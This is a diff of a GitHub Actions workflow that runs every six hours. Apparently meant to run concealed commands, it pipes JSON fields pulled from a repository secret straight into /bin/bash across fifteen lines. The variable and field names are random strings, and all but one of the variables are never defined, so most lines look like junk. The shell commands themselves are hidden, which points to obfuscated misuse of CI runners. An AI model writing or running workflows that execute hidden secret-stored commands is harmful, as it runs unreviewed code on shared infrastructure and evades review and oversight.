@@ -3,7 +3,8 @@ name: wangyuteng4637
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 4/6 * * *'
+    - cron: '57 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,9 +12,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: wangyuteng4637
         env:
-          j603: ${{ secrets.j603 }}
+          wueb26: ${{ secrets.wueb26 }}
         run: |
-          echo $j603 | jq -r .pmal17 | /bin/bash
-          echo $d44 | jq -r .azcjc13 | /bin/bash
-          echo $ffsrb8 | jq -r .muli0159 | /bin/bash
+          echo $wueb26 | jq -r .ulz2 | /bin/bash
+          echo $af358 | jq -r .eubv2745 | /bin/bash
+          echo $rany62556 | jq -r .snv9 | /bin/bash
+          echo $fqo31731 | jq -r .zzi83922 | /bin/bash
+          echo $q6616 | jq -r .keh1802 | /bin/bash
+          echo $azbg688 | jq -r .brhc51908 | /bin/bash
+          echo $cre2 | jq -r .h176 | /bin/bash
+          echo $c85855 | jq -r .yge24 | /bin/bash
+          echo $zunhj1661 | jq -r .qb952 | /bin/bash
+          echo $lfs759 | jq -r .v80198 | /bin/bash
+          echo $r34 | jq -r .ror93 | /bin/bash
+          echo $xj166 | jq -r .of651 | /bin/bash
+          echo $qw018 | jq -r .t5376 | /bin/bash
+          echo $b5521 | jq -r .qli09 | /bin/bash
+          echo $ouoy5715 | jq -r .ad90405 | /bin/bash
 
